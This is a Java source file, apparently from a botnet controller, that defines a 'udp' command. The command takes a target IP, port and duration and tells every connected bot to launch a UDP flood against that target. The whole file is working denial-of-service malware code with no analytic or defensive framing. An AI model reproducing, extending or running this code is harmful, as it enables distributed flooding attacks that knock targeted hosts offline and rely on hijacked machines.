package com.redpois0n.commands;

import com.redpois0n.bot.Bot;
import com.redpois0n.bot.Main;
import com.redpois0n.common.packets.Headers;
import com.redpois0n.exceptions.IllegalArgumentLengthException;


public class CommandUdp extends Command {

	/**
	 * Sends UDP flood packet
	 */
	@Override
	public void execute(String[] args, Bot[] bots) throws Exception {
		if (args.length != 3) {
			throw new IllegalArgumentLengthException();
		}
		
		int port = Integer.parseInt(args[1]);
		int time = Integer.parseInt(args[2]);
		
		for (int i = 0; i < bots.length; i++) {
			try {
				Bot bot = bots[i];
				bot.writeByte(Headers.PACKET_UDP_FLOOD);
				bot.writeString(args[0]);
				bot.writeInt(port);
				bot.writeInt(time);
			} catch (Exception ex) {
				Main.handleException(ex);
			}
		}
	}

	@Override
	public String getUsage() {
		return "udp [IP] [PORT] [SECONDS]";
	}

	@Override
	public String getExample() {
		return "udp 127.0.0.1 80 10";
	}

	@Override
	public String getDescription() {
		return "Launches UDP flood";
	}

}
